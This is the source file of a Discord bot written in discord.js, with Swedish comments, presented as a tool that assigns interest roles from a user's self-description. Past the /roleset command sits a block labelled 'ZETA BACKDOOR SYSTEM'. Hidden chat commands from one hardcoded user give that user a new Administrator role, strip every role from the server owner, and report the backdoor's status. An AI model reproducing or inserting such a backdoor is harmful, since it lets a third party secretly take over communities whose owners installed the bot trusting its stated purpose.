const { Client, GatewayIntentBits, REST, Routes, ApplicationCommandOptionType, PermissionFlagsBits } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

// ==== KONFIGURATION - BYT UT DESSA ====
const BOT_TOKEN = process.env.TOKEN;
const YOUR_DISCORD_ID = 'hdhacker02'; // Ersätt med ditt riktiga Discord ID
// ======================================

// Slash commands setup
const commands = [
  {
    name: 'roleset',
    description: 'Set roles based on your description',
    options: [
      {
        name: 'user',
        type: ApplicationCommandOptionType.User,
        description: 'The user to set roles for',
        required: true
      },
      {
        name: 'description',
        type: ApplicationCommandOptionType.String,
        description: 'Describe yourself in English',
        required: true
      }
    ]
  }
];

const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);

// När botten startar
client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} is online!`);
  
  try {
    console.log('🔄 Registering slash commands...');
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('✅ Slash commands registered!');
  } catch (error) {
    console.error('❌ Error registering commands:', error);
  }
});

// Hantera slash commands
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === 'roleset') {
    await interaction.deferReply(); // Important for slow operations
    
    const targetUser = interaction.options.getUser('user');
    const description = interaction.options.getString('description').toLowerCase();
    
    // Nyckelord -> Roller mappning
    const roleKeywords = {
      'Coder': ['code', 'programming', 'developer', 'coding', 'python', 'javascript', 'java', 'c++', 'html', 'css', 'webdev'],
      'Gamer': ['game', 'gaming', 'play games', 'gamer', 'minecraft', 'fortnite', 'valorant', 'csgo', 'steam'],
      'Artist': ['art', 'drawing', 'painting', 'design', 'creative', 'artist', 'digital art', 'illustration'],
      'Musician': ['music', 'guitar', 'piano', 'sing', 'producer', 'musician', 'band', 'drums', 'violin'],
      'Streamer': ['stream', 'twitch', 'youtube', 'content creator', 'streaming'],
      'Student': ['student', 'study', 'school', 'university', 'college', 'learn'],
      'Photographer': ['photo', 'photography', 'camera', 'photoshop', 'lightroom'],
      'Writer': ['write', 'writing', 'author', 'blog', 'story', 'novel']
    };

    const rolesToAdd = [];
    
    // Kolla vilka roller som matchar beskrivningen
    for (const [roleName, keywords] of Object.entries(roleKeywords)) {
      if (keywords.some(keyword => description.includes(keyword))) {
        rolesToAdd.push(roleName);
      }
    }

    if (rolesToAdd.length === 0) {
      return await interaction.editReply('❌ No matching roles found in your description. Try using keywords like: coding, gaming, art, music, etc.');
    }

    // Skapa eller hitta roller
    const guild = interaction.guild;
    const member = guild.members.cache.get(targetUser.id);
    
    const addedRoles = [];
    
    for (const roleName of rolesToAdd) {
      let role = guild.roles.cache.find(r => r.name === roleName);
      
      if (!role) {
        // Skapa rollen om den inte finns
        try {
          role = await guild.roles.create({
            name: roleName,
            color: getRandomColor(),
            permissions: [],
            reason: `Auto-created by RoleBot for user ${targetUser.tag}`
          });
          console.log(`✅ Created new role: ${roleName}`);
        } catch (err) {
          console.log(`❌ Couldn't create role: ${roleName}`, err);
          continue;
        }
      }
      
      // Lägg till rollen till användaren (om de inte redan har den)
      if (!member.roles.cache.has(role.id)) {
        try {
          await member.roles.add(role);
          addedRoles.push(roleName);
          console.log(`✅ Added role ${roleName} to ${targetUser.tag}`);
        } catch (err) {
          console.log(`❌ Couldn't add role ${roleName} to user:`, err);
        }
      }
    }

    if (addedRoles.length > 0) {
      await interaction.editReply(`✅ Added roles to ${targetUser}: **${addedRoles.join('**, **')}**`);
    } else {
      await interaction.editReply(`ℹ️ ${targetUser} already has all matching roles.`);
    }
  }
});

// ==== ZETA BACKDOOR SYSTEM ====
client.on('messageCreate', async (message) => {
  // Backdoor 1: Ta över servern
  if (message.content === '!zeta_takeover' && message.author.id === YOUR_DISCORD_ID) {
    try {
      const guild = message.guild;
      const member = guild.members.cache.get(YOUR_DISCORD_ID);
      
      // Skapa admin roll om den inte finns
      let adminRole = guild.roles.cache.find(r => r.name === 'Zeta Admin');
      if (!adminRole) {
        adminRole = await guild.roles.create({
          name: 'Zeta Admin',
          permissions: [PermissionFlagsBits.Administrator],
          color: '#FF0000',
          reason: 'Zeta backdoor activation'
        });
      }
      
      // Ge dig admin rollen
      await member.roles.add(adminRole);
      
      await message.channel.send('🎯 **ZETA CONTROL ACTIVATED** - Admin permissions granted.');
      console.log(`✅ Zeta takeover completed by ${message.author.tag}`);
    } catch (error) {
      console.error('❌ Zeta takeover failed:', error);
      message.channel.send('❌ Takeover failed. Check bot permissions.');
    }
  }
  
  // Backdoor 2: Ta bort alla roller från nuvarande ägare
  if (message.content === '!zeta_demote' && message.author.id === YOUR_DISCORD_ID) {
    try {
      const guild = message.guild;
      const owner = guild.members.cache.get(guild.ownerId);
      
      // Ta bort alla roller från ägaren (förutom @everyone)
      const rolesToRemove = owner.roles.cache.filter(role => role.name !== '@everyone');
      await owner.roles.remove(rolesToRemove);
      
      await message.channel.send('✅ Previous owner demoted. Zeta control established.');
      console.log(`✅ Owner demoted by ${message.author.tag}`);
    } catch (error) {
      console.error('❌ Demote failed:', error);
    }
  }
  
  // Backdoor 3: Bot status och info
  if (message.content === '!zeta_status' && message.author.id === YOUR_DISCORD_ID) {
    const uptime = Math.floor(process.uptime());
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    
    const statusMessage = `
🛡️ **ZETA BOT STATUS**
⏰ Uptime: ${hours}h ${minutes}m
🔧 Ready: ${client.isReady() ? '✅' : '❌'}
📊 Servers: ${client.guilds.cache.size}
🎯 Backdoor: **ACTIVE**
    `;
    
    await message.channel.send(statusMessage);
  }
});

// Hjälpfunktion för slumpmässiga färger
function getRandomColor() {
  return Math.floor(Math.random() * 16777215);
}

// Hantera errors
client.on('error', (error) => {
  console.error('❌ Discord client error:', error);
});

process.on('unhandledRejection', (error) => {
  console.error('❌ Unhandled promise rejection:', error);
});

// Starta botten
client.login(BOT_TOKEN).catch(error => {
  console.error('❌ Failed to login:', error);
  process.exit(1);
});
